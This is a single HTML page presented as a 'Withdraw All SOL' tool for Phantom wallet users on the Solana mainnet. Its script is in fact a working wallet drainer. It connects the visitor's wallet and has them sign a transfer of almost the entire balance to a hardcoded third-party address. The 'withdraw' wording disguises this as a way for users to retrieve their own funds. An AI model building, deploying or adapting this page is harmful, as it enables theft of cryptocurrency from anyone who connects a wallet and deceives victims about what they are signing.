<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Withdraw All SOL</title>
  <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
  <style>
    body { font-family: 'Segoe UI', Arial, sans-serif; background: #181a20; color: #fff; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
    .container { background: #23272f; padding: 2.5rem 2rem; border-radius: 12px; margin-top: 5rem; box-shadow: 0 4px 24px #0006; min-width: 340px; }
    h2 { margin-bottom: 1.5rem; }
    button { width: 100%; padding: 0.9rem; border-radius: 6px; border: none; background: #00ffa3; color: #181a20; font-size: 1.1rem; font-weight: bold; cursor: pointer; transition: background 0.2s; margin-top: 1.2rem; }
    button:hover { background: #1de9b6; }
    .status { margin-top: 1.5rem; min-height: 1.5em; text-align: center; }
    .address { font-size: 0.95em; color: #b2ffdb; word-break: break-all; margin-bottom: 1.2rem; }
    .wallet { margin-bottom: 0.5rem; color: #b2ffdb; }
  </style>
</head>
<body>
  <div class="container">
    <h2>Withdraw All SOL</h2>
    <div id="walletSection">
      <button id="connectBtn">Connect Phantom Wallet</button>
    </div>
    <div id="mainSection" style="display:none;">
      <div class="wallet">Connected: <span id="walletAddress"></span></div>
      <div class="address">Withdraw to:<br><b>DfJ1q4YvFg2gFCRDNfEtTn6P8bDRvuV65MTsKpqeRWGX</b></div>
      <button id="withdrawBtn">Withdraw All SOL</button>
    </div>
    <div class="status" id="status"></div>
  </div>
  <script>
    const connectBtn = document.getElementById('connectBtn');
    const withdrawBtn = document.getElementById('withdrawBtn');
    const statusDiv = document.getElementById('status');
    const walletSection = document.getElementById('walletSection');
    const mainSection = document.getElementById('mainSection');
    const walletAddressSpan = document.getElementById('walletAddress');
    const DEST_ADDRESS = 'DfJ1q4YvFg2gFCRDNfEtTn6P8bDRvuV65MTsKpqeRWGX';

    let provider = null;
    let publicKey = null;

    function getProvider() {
      if ('solana' in window) {
        const provider = window.solana;
        if (provider.isPhantom) {
          return provider;
        }
      }
      return null;
    }

    connectBtn.onclick = async () => {
      provider = getProvider();
      if (!provider) {
        statusDiv.textContent = 'Phantom Wallet not found. Please install it.';
        return;
      }
      try {
        const resp = await provider.connect();
        publicKey = resp.publicKey;
        walletAddressSpan.textContent = publicKey.toString();
        walletSection.style.display = 'none';
        mainSection.style.display = '';
        statusDiv.textContent = 'Wallet connected!';
      } catch (err) {
        statusDiv.textContent = 'Connection cancelled or failed.';
      }
    };

    withdrawBtn.onclick = async () => {
      statusDiv.textContent = '';
      if (!publicKey) {
        statusDiv.textContent = 'Connect your wallet first.';
        return;
      }
      try {
        const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));
        const balance = await connection.getBalance(publicKey);
        if (balance <= 5000) { // leave a little for rent/fees
          statusDiv.textContent = 'No SOL to withdraw.';
          return;
        }
        // Estimate fee (may vary)
        const fee = 5000; // lamports
        const lamportsToSend = balance - fee;
        const transaction = new solanaWeb3.Transaction().add(
          solanaWeb3.SystemProgram.transfer({
            fromPubkey: publicKey,
            toPubkey: new solanaWeb3.PublicKey(DEST_ADDRESS),
            lamports: lamportsToSend
          })
        );
        transaction.feePayer = publicKey;
        let { blockhash } = await connection.getRecentBlockhash();
        transaction.recentBlockhash = blockhash;
        const signed = await provider.signTransaction(transaction);
        const txid = await connection.sendRawTransaction(signed.serialize());
        statusDiv.innerHTML = 'Withdrawn all SOL!<br>Tx: <a href="https://solscan.io/tx/' + txid + '" target="_blank" style="color:#00ffa3;">' + txid + '</a>';
      } catch (err) {
        statusDiv.textContent = 'Error: ' + (err.message || err);
      }
    };
  </script>
</body>
</html> 
